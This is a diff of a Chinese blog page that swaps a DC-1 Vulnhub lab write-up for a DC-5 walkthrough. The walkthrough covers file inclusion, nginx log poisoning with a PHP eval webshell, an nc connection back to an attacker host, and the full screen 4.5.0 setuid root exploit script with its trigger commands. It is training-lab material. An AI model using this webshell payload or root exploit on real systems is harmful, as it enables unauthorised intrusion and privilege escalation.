@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="靶场,Linux提权,Find提权," />
+  <meta name="keywords" content="Vulnhub,靶机,文件包含,screen提权," />
 
 
 
@@ -79,25 +79,36 @@
 
 
 
-<meta name="description" content="DC-1靶机信息简介下载地址目标:获得root目录下的flag">
+<meta name="description" content="DC-5靶机基本信息下载地址目标:获得root权限，并拿到flag特点:任意文件包含+ngix日志写入小马screen提权">
 <meta property="og:type" content="article">
-<meta property="og:title" content="DC-1靶机">
-<meta property="og:url" content="http://example.com/2021/12/25/DC-1%E9%9D%B6%E6%9C%BA/index.html">
+<meta property="og:title" content="DC-5靶机">
+<meta property="og:url" content="http://example.com/2022/01/22/DC-5%E9%9D%B6%E6%9C%BA/index.html">
 <meta property="og:site_name" content="Recoder">
-<meta property="og:description" content="DC-1靶机信息简介下载地址目标:获得root目录下的flag">
+<meta property="og:description" content="DC-5靶机基本信息下载地址目标:获得root权限，并拿到flag特点:任意文件包含+ngix日志写入小马screen提权">
 <meta property="og:locale">
-<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091333.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091512.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092049.png">
-<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092952.png">
-<meta property="article:published_time" content="2021-12-25T01:06:57.000Z">
-<meta property="article:modified_time" content="2021-12-25T01:06:57.000Z">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122151921.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155347.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155420.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155707.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155724.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155809.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155950.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122160303.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122162829.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122163202.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171654.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171826.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172526.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172553.png">
+<meta property="article:published_time" content="2022-01-22T07:12:29.000Z">
+<meta property="article:modified_time" content="2022-01-22T07:12:29.000Z">
 <meta property="article:author" content="Laplace">
-<meta property="article:tag" content="靶场">
-<meta property="article:tag" content="Linux提权">
-<meta property="article:tag" content="Find提权">
+<meta property="article:tag" content="Vulnhub">
+<meta property="article:tag" content="靶机">
+<meta property="article:tag" content="文件包含">
+<meta property="article:tag" content="screen提权">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091333.png">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122151921.png">
 
 
 
@@ -127,13 +138,13 @@
 
 
 
-  <link rel="canonical" href="http://example.com/2021/12/25/DC-1靶机/"/>
+  <link rel="canonical" href="http://example.com/2022/01/22/DC-5靶机/"/>
 
 
 
 
 
-  <title>DC-1靶机 | Recoder</title>
+  <title>DC-5靶机 | Recoder</title>
   
 
 
@@ -294,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/25/DC-1%E9%9D%B6%E6%9C%BA/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/22/DC-5%E9%9D%B6%E6%9C%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Laplace">
@@ -311,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">DC-1靶机</h1>
+          <h1 class="post-title" itemprop="name headline">DC-5靶机</h1>
         
 
         <div class="post-meta">
@@ -323,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-25T09:06:57+08:00">
-                2021-12-25
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-22T15:12:29+08:00">
+                2022-01-22
               </time>
             
 
@@ -381,10 +392,37 @@
       
 
       
-        <h1 id="DC-1靶机"><a href="#DC-1靶机" class="headerlink" title="DC-1靶机"></a>DC-1靶机</h1><h2 id="信息简介"><a href="#信息简介" class="headerlink" title="信息简介"></a>信息简介</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-1,292/">下载地址</a><br>目标:获得root目录下的flag</p>
+        <h1 id="DC-5靶机"><a href="#DC-5靶机" class="headerlink" title="DC-5靶机"></a>DC-5靶机</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/dc-5,314/">下载地址</a><br>目标:获得root权限，并拿到flag<br>特点:<br>任意文件包含+ngix日志写入小马<br>screen提权</p>
 <span id="more"></span>
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>扫描结果开发80端口和111RPC端口<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122151921.png">  </p>
+<p>进入之后是一个静态网页，点击了一下没有发现有效的信息。同时目录扫描的结果也存在/footer.php 和/thankyou.php两个文件。<br>footer.php十一个版权脚标  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155347.png">  </p>
+<p>thankyou.php如下  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155420.png">  </p>
+<p>这里去网上，搜索发现thankyou.php的版权标志不同，因此怀疑该处存在文件包含?(<del>我是不知道大佬怎么看出来的</del>)。    </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155707.png">  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155724.png">  </p>
+<p>接着用字典跑BurpSuite爆破参数得到file是传输的参数。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155809.png">  </p>
+<p>接着尝试进行文件读取，发现可以读取passwd文件。  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122155950.png">  </p>
+<p>通过前面的扫描知道http服务是使用ngix搭建的。我们可以往ngix中的日志写入php小马，然后读取日志文件运行。<br>接着读取nginx配置信息。获得日志文件路径  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">配置信息路径 /etc/nginx/nginx.conf</span><br><span class="line">日志路径</span><br><span class="line">access_log /var/log/nginx/access.log;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122160303.png">  </p>
+<p>现在往日志中写入一句话木马<br><code>file=&lt;?php eval($_POST[&#39;cmd2&#39;]); ?&gt;</code><br>使用蚁剑进行连接。  </p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122162829.png"></p>
+<p>打开终端后使用nc连接到kali<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122163202.png">  </p>
+<p>使用find查看是否存在可以提取的应用。没有常见的提取应用但是存在<code>screen-4.5.0</code></p>
+<p><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171654.png">  </p>
+<p>尝试搜索是否存在可以提权的可能，存在可以提权的漏洞<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122171826.png">  </p>
+<p>查看提权的文件，按照它的过程生成libhax.so 和 rootshell两个文件  </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017)</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;~ gnu/screenroot ~&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] First, we create our shell and library...&quot;</span></span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/libhax.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="string">__attribute__ ((__constructor__))</span></span><br><span class="line"><span class="string">void dropshell(void)&#123;</span></span><br><span class="line"><span class="string">    chown(&quot;/tmp/rootshell&quot;, 0, 0);</span></span><br><span class="line"><span class="string">    chmod(&quot;/tmp/rootshell&quot;, 04755);</span></span><br><span class="line"><span class="string">    unlink(&quot;/etc/ld.so.preload&quot;);</span></span><br><span class="line"><span class="string">    printf(&quot;[+] done!\n&quot;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; <span class="string">EOF &gt; /tmp/rootshell.c</span></span><br><span class="line"><span class="string">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="string">int main(void)&#123;</span></span><br><span class="line"><span class="string">    setuid(0);</span></span><br><span class="line"><span class="string">    setgid(0);</span></span><br><span class="line"><span class="string">    seteuid(0);</span></span><br><span class="line"><span class="string">    setegid(0);</span></span><br><span class="line"><span class="string">    execvp(&quot;/bin/sh&quot;, NULL, NULL);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span></span><br><span class="line"><span class="built_in">cd</span> /etc</span><br><span class="line"><span class="built_in">umask</span> 000 <span class="comment"># because</span></span><br><span class="line">screen -D -m -L ld.so.preload <span class="built_in">echo</span> -ne  <span class="string">&quot;\x0a/tmp/libhax.so&quot;</span> <span class="comment"># newline needed</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;[+] Triggering...&quot;</span></span><br><span class="line">screen -ls <span class="comment"># screen itself is setuid, so...</span></span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+<p>使用nc将这两个文件传输到/tmp目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali:</span><br><span class="line">nc -lnvp 4444 &lt; libhax.so</span><br><span class="line">nc -lnvp 4444 &lt; rootshell</span><br><span class="line"></span><br><span class="line">靶机:</span><br><span class="line">nc 10.1.1.139 4444 &gt; libhax.so</span><br><span class="line">nc 10.1.1.139 4444 &gt; rootshell</span><br></pre></td></tr></table></figure>
+<p>安装步骤输入指令获得root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd /etc</span><br><span class="line">umask 000</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot;</span><br><span class="line">screen -ls</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
 
-<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>nmap扫描结果<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091333.png"><br>80端口上是使用Drupal建立的博客<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225091512.png"><br>直接跑msfconsole获得www-data权限的shell。<br>寻找具有suid的可执行程序。<br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092049.png"><br>发现可以使用Find，进行提权。<code> find / -name flag1.txt -exec &quot;/bin/sh&quot; \</code><br><img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20211225092952.png">  </p>
+<p> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172526.png">  </p>
+<p> 最后在/root查看flag<br> <img src="https://raw.githubusercontent.com/sincelong/BlogImage/main/img/20220122172553.png"></p>
 
       
     </div>
@@ -402,11 +440,13 @@
       
         <div class="post-tags">
           
-            <a href="/tags/%E9%9D%B6%E5%9C%BA/" rel="tag"># 靶场</a>
+            <a href="/tags/Vulnhub/" rel="tag"># Vulnhub</a>
           
-            <a href="/tags/Linux%E6%8F%90%E6%9D%83/" rel="tag"># Linux提权</a>
+            <a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"># 靶机</a>
           
-            <a href="/tags/Find%E6%8F%90%E6%9D%83/" rel="tag"># Find提权</a>
+            <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          
+            <a href="/tags/screen%E6%8F%90%E6%9D%83/" rel="tag"># screen提权</a>
           
         </div>
       
@@ -419,8 +459,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2021/12/22/CH4INRULZ-v1-0-1%E9%9D%B6%E6%9C%BA/" rel="next" title="CH4INRULZ_v1.0.1靶机">
-                <i class="fa fa-chevron-left"></i> CH4INRULZ_v1.0.1靶机
+              <a href="/2022/01/20/DC-4%E9%9D%B6%E6%9C%BA/" rel="next" title="DC-4靶机">
+                <i class="fa fa-chevron-left"></i> DC-4靶机
               </a>
             
           </div>
@@ -428,10 +468,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2021/12/27/DC-2%E9%9D%B6%E6%9C%BA/" rel="prev" title="DC-2靶机">
-                DC-2靶机 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -563,7 +599,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-1%E9%9D%B6%E6%9C%BA"><span class="nav-text">DC-1靶机</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E7%AE%80%E4%BB%8B"><span class="nav-text">信息简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-text">过程</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#DC-5%E9%9D%B6%E6%9C%BA"><span class="nav-text">DC-5靶机</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E7%A8%8B"><span class="nav-text">过程</span></a></li></ol></li></ol></div>
             
 
           </div>
